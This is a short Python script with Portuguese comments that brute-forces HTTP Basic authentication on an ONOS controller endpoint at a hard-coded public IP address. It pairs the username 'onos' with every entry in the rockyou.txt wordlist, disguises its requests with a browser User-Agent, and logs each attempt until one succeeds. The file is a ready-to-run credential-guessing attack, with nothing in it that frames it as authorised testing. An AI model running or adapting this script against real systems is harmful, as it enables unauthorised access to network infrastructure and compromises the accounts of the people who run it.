import base64
import requests
import logging
# URL do serviço alvo que será acessado.
url = "http://34.139.11.27:8181/onos/v1/docs/index.html"

# Configuração do logger para registrar os resultados
logging.basicConfig(
    filename="01_brute_force_results.log",  # Arquivo onde os logs serão armazenados
    level=logging.DEBUG,                   # Nível de log (INFO para capturar mensagens de sucesso e erro)
    format="%(asctime)s - %(levelname)s - %(message)s",  # Formato do log
)


# Nome de usuário que será usado na autenticação.
username = "onos"

# Caminho para o arquivo contendo a lista de senhas a serem testadas.
wordlist_path = './wordlists/rockyou.txt'

# Função para codificar credenciais em formato Base64.
# Aceita o nome de usuário e a senha como parâmetros.
def encode_credentials(username: str, password: str):
    # Concatena nome de usuário e senha no formato "username:password".
    credentials = f"{username}:{password}"
    # Codifica as credenciais em Base64 utilizando o padrão ISO-8859-1.
    return base64.b64encode(credentials.encode('ISO-8859-1')).decode("ISO-8859-1")

# Abre o arquivo de lista de senhas no modo de leitura com codificação ISO-8859-1.
with open(wordlist_path, 'r', encoding='ISO-8859-1') as wordlist:
    # Itera por cada senha no arquivo.
    for password in wordlist: 
        # Remove espaços ou quebras de linha no início e no final da senha.
        password = password.strip()

        # Codifica as credenciais (username e senha atual) em formato Base64.
        encoded_credentials = encode_credentials(username, password)

        # Define os cabeçalhos HTTP para a requisição.
        headers = {
            "Authorization": f'Basic {encoded_credentials}',  # Cabeçalho de autenticação básica.
            "User-Agent": "Mozilla/5.0",  # Define o User-Agent como um navegador comum.
        }

        # Envia uma requisição GET para a URL especificada com os cabeçalhos definidos.
        response = requests.get(url, headers=headers)

        # Verifica se o status da resposta indica sucesso (200 OK).
        if(response.status_code == 200):
            # Exibe a senha encontrada e interrompe o loop.
            print(f'Senha encontrada: {password}')
            logging.info(f'Senha encontrada: {password}')
            break
        else:
            # Exibe mensagem de tentativa malsucedida com a senha atual.
            print(f"Tentativa falhou com senha: '{password}'")
            logging.info(f"Tentativa falhou com senha: '{password}'")

